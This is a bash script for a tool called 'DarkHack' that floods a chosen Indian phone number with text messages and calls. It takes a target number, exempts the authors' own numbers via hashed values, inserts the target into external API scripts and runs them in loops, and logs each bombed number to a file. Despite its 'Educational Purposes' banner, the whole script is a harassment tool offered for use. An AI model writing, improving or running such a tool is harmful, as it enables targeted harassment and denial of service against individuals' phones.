#!/bin/bash



RED="$(printf '\e[31m')"
GREEN="$(printf '\e[32m')"
ORANGE="$(printf '\e[33m')"
BLUE="$(printf '\e[34m')"
MAGENTA="$(printf '\e[35m')"
CYAN="$(printf '\e[36m')"
WHITE="$(printf '\e[37m')"
BLACK="$(printf '\e[30m')"

apt-get install -y git curl wget pv espeak figlet

clear
just() {
clear
echo ""
echo ""
printf  "                      \e[1;33m--->Connecting<---"
echo ""
echo ""
echo ""
}


banner() {

echo -e ""
figlet DarkHack
echo ""
sleep 1
echo "  $WHITE Author:$GREEN King-Nazim And MishalMMSS"
sleep 1
echo "This Tool is developed by Dark Fighting Army (DFA)"
echo ""

}

#    Check Internet
wget -q --spider https://github.com/King-Nazim

if [ $? -eq 0 ]; then
    just
else
    clear
    echo -e "\e[1;34m‎‎‏‏ ‎"
    banner
    sleep 1
    echo ""
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m You are not connected to internet !\e[93m"
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m Please connect and try again !!\e[93m"
    echo ""
    echo ""
    exit
fi

rm .server.txt > /dev/null 2>&1
wget -L https://raw.githubusercontent.com/anubhavanonymous/serverxlr8/main/.server.txt  > /dev/null 2>&1
serverup="On"
server=$(cat .server.txt | grep On)
if [[ $server = $serverup ]]
then
echo ""
else
clear
echo ""
sleep 1
figlet ERROR 404
echo ""
echo ""
sleep 2
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Sorry for the inconvenience :(" | pv -qL 30
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[36m The Server is under maintenance !!" | pv -qL 20
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Contact the developer !" | pv -qL 30
echo ""
exit
exit
exit
fi

updatee() {
clear
echo -e "\e[92m "
clear
echo ""
figlet Updating Script
echo ""
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[36m Requesting Update From Source...\e[93m"
sleep 2
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[0m Request Attempt Successful..\e[93m"
sleep 1
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[36m Updating Now...\e[93m"
sleep 2
echo ""
cd ..
rm -rf darkhack
git clone https://github.com/King-Nazim/darkhack > /dev/null 2>&1
cd darkhack
chmod +x bomb.sh
clear
echo ""
figlet Script Updated
echo ""
sleep 3
echo ""
echo -e "        \e[92m[\e[91m~\e[92m]\e[91m Restarting DarkHack !\e[93m"
sleep 2
bash bomb.sh
}


bombrecord() {
clear
echo ""
figlet Bomb Record
echo ""
echo ""
echo -e "     \e[92m[\e[36m~\e[92m]\e[93m This is a record of numbers which had been bombed !\e[93m" | pv -qL 30
echo " $GREEN"
cat .bombrecord.txt
exit
}

PW_WD=$(pwd)
cd model
cp headapis $PW_WD
cp tailapis $PW_WD
cp anonapi $PW_WD
cd ..
#<<<-----------SELF PROTECTION------------>>>
#bhutuu
#normal format
no1=d3741a8e275cc6e23ccfe48b948b1eae
#91format
no2=7580a329fbb8be8c7eac5d0d5ec1a616
+91format
no3=62030872254a686c456b30405f17db6f

#others' no
#normal format
no4=252b65904855b5f2cc5d37948d9007a1
#91format
no5=7e1200a9ca4c513d4372d92a4b00165c
#+91format
no6=8be4b2029c307941a04cf072fecdcb4b

#others' no2
#normal format
no7=d579fd6d36bb10af6693a80b656c9fe6
#91format
no8=44edee71b9e96706e479d265f8679fd4
#+91format
no9=7af21f33a87fba3ba7c071898876f079

#bhutuu2
#normal format
mo1=84c794b2d2358583f225f1d4f048e460
#91format
mo2=f0ca77644f362b01b8891f2ae927b945
#+91format
mo3=26025923d6e18c871f517c9f791fa602


#SECRET=VmtjMWQyTnJNSGROVlZab1pXdGFUMVZyV2tkT2JGSjFXa2hhVVZWWE9EbERaejA5Q2c9PQo=
#for i in {1..5}
#do SECRET=$(echo $SECRET | base64 --decode)
#done


about() {
clear
echo -e '''
         \e[1;91m      ╔═══════════╗
         \e[1;91m    ╔═╝\e[1;97m███████████\e[1;91m╚═╗
         \e[1;91m   ╔╝\e[1;97m███████████████\e[1;91m╚╗
         \e[1;91m   ║\e[1;97m█████\e[1;92mDarkHack\e[1;97m████\e[1;91m║
         \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m
         \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m
         \e[1;91m   ║\e[1;97m█\e[1;91m╔\e[1;97m█████████████\e[1;91m╗\e[1;97m█\e[1;91m║\e[1;91m
         \e[1;91m   ╚╦╝\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;91m╚╦╝\e[1;91m
         \e[1;91m   ╔╝\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m███\e[1;90m▒▒▒▒\e[1;97m██\e[1;91m╚╗\e[1;91m
         \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒▒\e[1;97m███\e[1;90m▒▒▒▒▒\e[1;97m██\e[1;91m|\e[1;91m
         \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m█████\e[1;90m▒▒▒▒\e[1;97m██\e[1;91m║\e[1;94m
         \e[1;91m   ╚╗\e[1;97m███████████████\e[1;91m╔╝\e[1;94m
         \e[1;91m  ╔═╬══╦╝\e[1;97m██\e[1;90m▒\e[1;97m█\e[1;90m▒\e[1;97m██\e[1;91m╚╦══╝\e[1;90m .▒..
         \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█████████\e[1;91m║\e[1;90m ...▒.       \e[1;93m
         \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║\e[1;90m　.▒..
         \e[1;91m  ║\e[1;97m█\e[1;91m║══╚═╩══╩╦═╩═╩═╦╗\e[1;90m▒.
         \e[1;91m ╔╝\e[1;97m█\e[1;91m╚══╦═╦══╦╩═╦═╦═╩╝  \e[38;5;48m
         \e[1;91m╔╝\e[1;97m█████\e[1;91m║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║
         \e[1;91m║\e[1;97m██████\e[1;91m║\e[1;97m█████████\e[1;91m║
''' | pv -qL 300
sleep 1
echo -e "             This is $GREEN King-Nazim And MishalMMSS" | pv -qL 150
echo "                 From Dark Hackers !" | pv -qL 150
echo ""
echo -e "     $GREEN  Ethical Hackers$WHITE |$GREEN CyberSec Students$WHITE |$GREEN Programmers" | pv -qL 10
echo ""
printf "\e[0m\e[92m                 Group Admin at$WHITE Dark Hackers\e[0m\n" | pv -qL 12
echo ""
echo "       $MAGENTA          Our social handles are below !!" | pv -qL 10
echo ""
printf "\e[0m\e[92m          Github \e[0m\e[91m     :    \e[0m\e[96mgithub.com/King-Nazim\e[0m\n" | pv -qL 50
printf "\e[0m\e[92m          Github \e[0m\e[91m     :    \e[0m\e[96mgithub.com/Mishalmmss\e[0m\n" | pv -qL 50
echo ""
printf "\e[0m\e[92m         Instagram \e[0m\e[91m   :   \e[0m\e[96minstagram.com/nazimcp7\e[0m\n" | pv -qL 50
printf "\e[0m\e[92m         Instagram \e[0m\e[91m   :   \e[0m\e[96minstagram.com/_mishal_hussain_\e[0m\n" | pv -qL 50
echo ""
echo -e "\e[1;91m                        Happy Hacking :)" | pv -qL 10
sleep 7
menux
}

eexec() {
echo "Under construction"
exit
}

menu() {
clear
echo ""
figlet Bombing
echo ""
echo ""
printf "             \e[1;92m[\e[0m Dark_Hacks\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m"
read targett
passd=$(echo "$targett" | md5sum | awk '{printf $1}')
if [[ $passd == $no1 || $passd == $no2 || $passd == $no3 || $passd == $mo1 || $passd == $mo2 || $passd == $mo3 ]]; then
echo
printf "\033[1;32m[\033[1;31m!\033[1;32m]\033[1;31mWrong number lol ;)! don't be so smart rotor. you can be self bombed for this wrong attempt!!Me Suman kumar ~BHUTUU github:- https://github.com/BHUTUU/ \033[0m\n"
echo
exit 1
elif [[ $passd == $no4 || $passd == $no5 || $passd == $no6 || $passd == $no7 || $passd == $no8 || $passd == $no9 ]]; then
echo
printf "\033[1;32m[\033[1;31m!\033[1;32m]\033[1;31mWrong number lol! it developer here!! this bombing may results to self bomb for you so don't be so smart!!\033[n\n"
echo
exit 1
else
printf "\n"
echo ""
Date=$(date)
echo -e "      $targett was bombed on $Date"  >> .bombrecord.txt
printf "  Bombing\n"
echo ""
printf "             ~~~\e[1;92m Attack Started On +91$targett \e[0m~~~"
sleep 1
echo ""
echo ""
printf "\n"
printf "   Press ctrl+c to quit ! \n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Else it will automatically stop after 5 min\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m After sending 250 msgs and 50 calls !!\e[93m"
echo ""

while read a; do
    echo ${a//€shushhi/$targett}
done < headapis > headapis.t
mv headapis{.t,}

while read a; do
    echo ${a//€shushhi/$targett}
done < tailapis > tailapis.t
mv tailapis{.t,}

for i in {1..4}
do bash headapis
done

for i in {1..27}
do bash tailapis
done

exit 1
fi
}






menux() {
clear
clear
banner
sleep 1
DATE=$(date)
echo "$WHITE✯ Started on $RED$DATE"
echo "$WHITE------------------------------"
printf "\e[1;33m⚡ This tool is only for Educational Purposes !!\e[0m\n"
echo "------------------------------"
echo ""
sleep 1
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;33m MASS BOMBING \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;33m UPDATE \e[0m\n"
printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;33m ABOUT \e[0m\n"
printf "\e[1;92m[\e[0m 4\e[1;92m ]\e[0m>>>\e[1;33m QUIT \e[0m\n"
echo ""
printf "\e[1;31m Select Option !! \e[0m−−⋙⋙⋙ "
read options
if [ "$options" -eq "0" ];then
        bombrecord
fi
if [ "$options" -eq "1" ];then
        menu
fi
if [ "$options" -eq "2" ];then
        updatee
fi
if [ "$options" -eq "3" ];then
        about
fi
if [ "$options" -eq "007" ];then
        eexec
fi
if [ "$options" -eq "4" ];then
        echo ""
        echo -e "\e[92m[\e[91m~\e[92m]\e[93m Thanks for Using Dark_Hacks !\e[93m"
        echo ""
        exit
else
        menux
fi


}
menux

